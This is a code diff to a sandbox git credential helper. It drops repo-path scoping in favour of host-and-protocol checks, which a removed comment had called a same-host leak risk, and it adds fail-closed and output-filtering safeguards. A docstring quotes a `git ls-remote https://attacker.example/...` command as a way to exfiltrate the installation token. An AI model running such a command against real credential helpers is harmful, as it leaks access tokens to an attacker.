@@ -10,7 +10,7 @@ token captured at sandbox-creation time.
 Protocol summary (action = "get"):
 
     Input on stdin:  key=value lines terminated by an empty line
-    Output on stdout: the same lines back plus username=… and password=…
+    Output on stdout: request context lines plus username=… and password=…
 
 Caching: a successful response is persisted to `/run/oi/scm-creds.json` (mode
 0600). Subsequent invocations return the cached credentials until they're
@@ -32,7 +32,7 @@ import os
 import sys
 import time
 from pathlib import Path
-from typing import IO
+from typing import IO, cast
 
 import httpx
 
@@ -71,9 +71,9 @@ def _read_protocol_input(stream: IO[str]) -> dict[str, str]:
 def _resolve_endpoint() -> tuple[str, str, str] | None:
     """Resolve control-plane URL, sandbox token, and session id from env.
 
-    Returns ``None`` if any of the three are missing. The caller can then
-    decide to fall back to a static env-var token (used by image-build
-    sandboxes, which have no control plane).
+    Returns ``None`` if any of the three are missing. The caller falls back
+    to a static env-var token only when no control-plane context is present
+    at all (used by image-build sandboxes).
     """
     control_plane_url = os.environ.get("CONTROL_PLANE_URL", "").rstrip("/")
     auth_token = os.environ.get("SANDBOX_AUTH_TOKEN", "")
@@ -90,6 +90,14 @@ def _resolve_endpoint() -> tuple[str, str, str] | None:
     if not (control_plane_url and auth_token and session_id):
         return None
     return control_plane_url, auth_token, session_id
+
+
+def _has_control_plane_context() -> bool:
+    """Return true when this sandbox appears attached to a live session."""
+    return bool(
+        os.environ.get("CONTROL_PLANE_URL", "").strip()
+        or os.environ.get("SANDBOX_AUTH_TOKEN", "").strip()
+    )
 
 
 def _credentials_from_env() -> dict[str, object] | None:
@@ -109,39 +117,18 @@ def _credentials_from_env() -> dict[str, object] | None:
     }
 
 
-def _normalize_repo_path(path: str) -> str:
-    """Normalize a git credential `path=` value to ``owner/repo`` form."""
-    normalized = path.strip().strip("/").lower()
-    if normalized.endswith(".git/info/lfs"):
-        normalized = normalized[: -len(".git/info/lfs")]
-    if normalized.endswith(".git"):
-        normalized = normalized[: -len(".git")]
-    return normalized
-
-
-def _expected_repo_path() -> str | None:
-    """Return the session repo as ``owner/repo``, or None if not configured."""
-    owner = os.environ.get("REPO_OWNER", "").strip().lower()
-    name = os.environ.get("REPO_NAME", "").strip().lower()
-    if not owner or not name:
-        return None
-    return f"{owner}/{name}"
-
-
 def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
     """Decide whether to serve credentials for this credential request.
 
     The system-wide helper would otherwise hand the SCM token to any host
     git resolves — a malicious submodule URL or `git ls-remote
-    https://attacker.example/...` could exfiltrate the installation token.
-    We scope on three axes:
+    https://attacker.example/...` could exfiltrate the installation token. We
+    scope by protocol and host. We deliberately do not scope to the session repo:
+    the existing system uses installation-wide credentials, and setup/start hooks
+    may clone sibling private repositories that the installation can access.
 
     * protocol must be ``https`` (never hand a token to a plaintext remote);
-    * host must equal the configured ``VCS_HOST``;
-    * path must be the session repo. We set ``credential.useHttpPath=true``
-      wherever the helper is installed, so git always passes a path; a
-      missing path means a misconfigured image and we fail closed rather
-      than degrade to host-only scoping (which would re-open the leak).
+    * host must equal the configured ``VCS_HOST``.
 
     Returns ``(authorized, reason)`` so the caller can log the rejection.
     """
@@ -156,19 +143,6 @@ def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
     if requested_host != expected_host:
         return False, f"host={requested_host!r} (expected {expected_host!r})"
 
-    # Path is mandatory: we configure credential.useHttpPath=true wherever the
-    # helper is installed, so git always passes it. A missing path means a
-    # misconfigured image — fail closed rather than fall back to host-only
-    # scoping, which would re-open the same-host leak.
-    requested_path = input_lines.get("path", "").strip()
-    if not requested_path:
-        return False, "no path provided (credential.useHttpPath unset?)"
-    expected_path = _expected_repo_path()
-    if expected_path is None:
-        return False, "REPO_OWNER/REPO_NAME not configured"
-    if _normalize_repo_path(requested_path) != expected_path:
-        return False, f"path={requested_path!r} (expected {expected_path!r})"
-
     return True, ""
 
 
@@ -178,9 +152,12 @@ def _read_cached() -> dict[str, object] | None:
         return None
     try:
         with CACHE_FILE.open("r", encoding="utf-8") as fp:
-            cached = json.load(fp)
+            raw_cached = json.load(fp)
     except (OSError, json.JSONDecodeError):
         return None
+    if not isinstance(raw_cached, dict):
+        return None
+    cached = cast("dict[str, object]", raw_cached)
 
     expires_at_ms = cached.get("expires_at_epoch_ms")
     if not isinstance(expires_at_ms, (int, float)):
@@ -235,12 +212,16 @@ def _get_credentials() -> dict[str, object]:
     """Return cached credentials if fresh, otherwise refresh under a lock.
 
     Prefers control-plane brokerage. Falls back to the static
-    ``VCS_CLONE_TOKEN`` env var when the control-plane env is incomplete —
-    that's how image-build sandboxes (no session, no control plane)
-    authenticate their one-shot clone.
+    ``VCS_CLONE_TOKEN`` env var only when no control-plane context exists —
+    that's how image-build sandboxes authenticate their one-shot clone.
     """
     endpoint = _resolve_endpoint()
     if endpoint is None:
+        if _has_control_plane_context():
+            raise RuntimeError(
+                "Control plane environment is present but incomplete; "
+                "refusing VCS_CLONE_TOKEN fallback"
+            )
         env_creds = _credentials_from_env()
         if env_creds is None:
             raise RuntimeError(
@@ -272,8 +253,10 @@ def _get_credentials() -> dict[str, object]:
 
 
 def _emit_response(input_lines: dict[str, str], credentials: dict[str, object]) -> None:
-    """Write the protocol response (echo input lines + username/password)."""
+    """Write the protocol response (context lines + fresh username/password)."""
     for key, value in input_lines.items():
+        if key in {"username", "password"}:
+            continue
         sys.stdout.write(f"{key}={value}\n")
     sys.stdout.write(f"username={credentials['username']}\n")
     sys.stdout.write(f"password={credentials['password']}\n")
@@ -285,10 +268,14 @@ def _print_token() -> int:
     """Print just the password (token) for the gh CLI wrapper.
 
     Unlike the git `get` action this takes no protocol input and does no
-    host/path scoping — the gh wrapper has already checked the SCM host, and
-    the token returned is the same installation token regardless of repo.
-    Prints nothing and exits non-zero if no credential is available.
+    path scoping; the token returned is the same installation token
+    regardless of repo. We still enforce the GitHub host because this action
+    exists only for the GitHub CLI wrapper.
     """
+    if os.environ.get("VCS_HOST", "github.com").strip().lower() != "github.com":
+        _log("token action is only supported for github.com")
+        return 1
+
     try:
         credentials = _get_credentials()
     except Exception as e:
@@ -317,10 +304,10 @@ def main(argv: list[str] | None = None) -> int:
 
     input_lines = _read_protocol_input(sys.stdin)
 
-    # Scope the request to the session repo over https on the configured
-    # host. git treats an empty response as "I have nothing", so returning
-    # 0 with no output lets it fall through to any other helper or fail the
-    # auth cleanly — without us ever emitting the token to the wrong place.
+    # Scope the request to https on the configured host. git treats an empty
+    # response as "I have nothing", so returning 0 with no output lets it fall
+    # through to any other helper or fail the auth cleanly — without us ever
+    # emitting the token to the wrong host.
     authorized, reason = _is_authorized_request(input_lines)
     if not authorized:
         _log(f"refusing to serve credentials: {reason}")
